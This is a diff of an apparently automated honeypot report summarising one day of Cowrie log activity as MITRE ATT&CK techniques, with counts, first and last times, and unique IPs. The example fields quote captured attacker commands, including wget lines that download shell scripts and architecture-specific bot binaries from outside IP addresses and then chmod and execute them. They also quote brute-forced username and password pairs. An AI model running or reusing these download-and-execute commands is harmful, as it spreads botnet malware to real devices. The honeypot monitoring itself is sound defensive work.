@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-23 11:01:11",
+  "generated": "2026-08-23 12:04:45",
   "totals": {
-    "commands": 484,
-    "login_failed": 1063,
-    "login_success": 41,
-    "sessions": 1323
+    "commands": 516,
+    "login_failed": 1089,
+    "login_success": 46,
+    "sessions": 1365
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1063,
+      "count": 1089,
       "examples": [
         "root / q1w2e3r4",
         "user / qwe123",
@@ -21,30 +21,14 @@
         "user / 150.136.155.47"
       ],
       "first": "2026-08-23T00:00:13.506843Z",
-      "last": "2026-08-23T10:59:48.284984Z",
-      "unique_ips": 46
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 92,
-      "examples": [
-        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
-        "http://176.65.139.202:80/telnet.sh",
-        "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
-        "http://176.65.139.202/daredevil.armv7l",
-        "http://176.65.139.202/daredevil.mips"
-      ],
-      "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T11:00:21.911099Z",
-      "unique_ips": 10
+      "last": "2026-08-23T12:02:33.803415Z",
+      "unique_ips": 51
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 87,
+      "count": 102,
       "examples": [
         "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
         "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
@@ -53,14 +37,30 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r"
       ],
       "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T11:00:21.911099Z",
-      "unique_ips": 10
+      "last": "2026-08-23T11:22:55.185064Z",
+      "unique_ips": 11
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 96,
+      "examples": [
+        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
+        "http://176.65.139.202:80/telnet.sh",
+        "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
+        "http://176.65.139.202/daredevil.armv7l",
+        "http://176.65.139.202/daredevil.mips"
+      ],
+      "first": "2026-08-23T00:09:31.212472Z",
+      "last": "2026-08-23T11:22:55.185064Z",
+      "unique_ips": 11
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 41,
+      "count": 46,
       "examples": [
         "hikvision / hikvision",
         "bin / bin",
@@ -69,14 +69,14 @@
         "root / 123123"
       ],
       "first": "2026-08-23T00:09:30.963003Z",
-      "last": "2026-08-23T10:59:42.340247Z",
-      "unique_ips": 33
+      "last": "2026-08-23T11:54:32.157648Z",
+      "unique_ips": 37
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 13,
+      "count": 14,
       "examples": [
         "uname -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -85,8 +85,22 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-23T00:09:31.058995Z",
-      "last": "2026-08-23T10:38:41.293539Z",
-      "unique_ips": 8
+      "last": "2026-08-23T11:45:01.987215Z",
+      "unique_ips": 9
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 7,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-23T00:31:56.572618Z",
+      "last": "2026-08-23T11:22:19.825566Z",
+      "unique_ips": 7
     },
     {
       "id": "T1489",
@@ -101,20 +115,6 @@
       "first": "2026-08-23T06:26:28.701958Z",
       "last": "2026-08-23T10:38:41.293539Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 6,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "id",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
-      ],
-      "first": "2026-08-23T00:31:56.572618Z",
-      "last": "2026-08-23T10:59:45.712102Z",
-      "unique_ips": 6
     },
     {
       "id": "T1059.004",
@@ -217,43 +217,43 @@
   "unmapped": [
     [
       "/bin/busybox",
-      262
+      269
     ],
     [
       "shell",
-      11
+      12
     ],
     [
       "sh",
-      11
+      12
     ],
     [
       "system",
-      9
+      10
     ],
     [
       "enable",
-      8
+      9
     ],
     [
       "linuxshell",
-      6
+      7
     ],
     [
       "ping ;sh",
-      6
+      7
     ],
     [
       "enablelinuxshell",
-      5
+      6
     ],
     [
       "cd /proc && cat self/cmdline",
-      5
+      6
     ],
     [
       "busybox",
-      4
+      5
     ],
     [
       "/bin/busybox jdwqXcb7",
